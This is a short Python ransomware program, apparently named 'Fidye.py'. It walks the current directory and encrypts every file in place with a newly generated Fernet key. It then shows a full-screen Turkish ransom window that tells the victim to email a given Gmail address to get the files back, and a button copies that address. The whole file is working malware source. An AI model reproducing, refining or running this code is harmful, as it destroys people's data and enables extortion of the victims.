import cryptography.fernet
import cryptography.exceptions
import cryptography
import os
import sys
import tkinter
import webbrowser
import pyperclip
import threading

class key_method:
    key: bytes = b""

    def __init__(self, gen_file: bool = False) -> None:
        self.gen = True
        self.gen_file = gen_file
    
    def generate(self) -> None:
        if self.gen:
            key_method.key = cryptography.fernet.Fernet.generate_key()
        if self.gen_file:
            with open("key.key", "wb") as key_file:
                key_file.write(key_method.key)

def get_files() -> list:
    file_list = []
    dosyaklasor_list = os.walk(os.getcwd())

    for root, dirs, files in dosyaklasor_list:
        for file in files:
            if file == 'Fidye.py': # Replace if you will be create a exe file
                continue
            full_path = os.path.join(root, file)
            file_list.append(full_path)
            
    return file_list

def encrypt_file(file_dir: str, key: bytes | None = None) -> None:
    if file_dir == None: raise AttributeError("Do not write None")
    if key == None: raise AttributeError("Do not write None")
    
    try:
        with open(file_dir, "rb") as read_byte:
            content = read_byte.read()

        content = cryptography.fernet.Fernet(key=key).encrypt(content)
        
        with open(file_dir, "wb") as write_byte:
            write_byte.write(content)
    except (cryptography.exceptions.InvalidKey, PermissionError) as msg:
        print(f"[*] Error : {msg}")

def gmail() -> None:
    gmail_url = 'https://mail.google.com/'
    kopyalanacak_metin = "eraybuyukkaya9@gmail.com"
    pyperclip.copy(kopyalanacak_metin)
    webbrowser.open_new_tab(gmail_url)

def ui(size_x: int, size_y: int) -> None:
    root = tkinter.Tk()

    # Window Config
    root.geometry(f"{size_x}x{size_y}")
    root.config(background="black")
    root.title("DOSYALARINIZ TEHLİKEDE!")
    root.resizable(False, False)

    label_1 = tkinter.Label(root, text="Eğer dosyalarınızı kurtarmak istiyorsanız\n" \
    "verilen e-postaya ulaşın", foreground="white", font=('Arrial', 25), bg="Black")
    
    label_2 = tkinter.Label(root, text="G-MAİL: eraybuyukkaya9@gmail.com", foreground="green",
    font=('Arrial', 14), bg="Black")

    button = tkinter.Button(root, text="Kopyala", foreground="white", bg="blue",
    width=10, height=3, font=('Arrial', 10), command=lambda: threading.Thread(target=gmail, daemon=True).start())

    label_1.pack()
    label_2.pack(anchor="center", expand="yes")
    button.pack()

    root.mainloop()

if __name__ == '__main__':
    key_met = key_method(True)
    key_met.generate()
    key = key_met.key

    for file in get_files():
        encrypt_file(file, key=key_method.key)

    ui(800, 500)
        
    sys.exit(0)
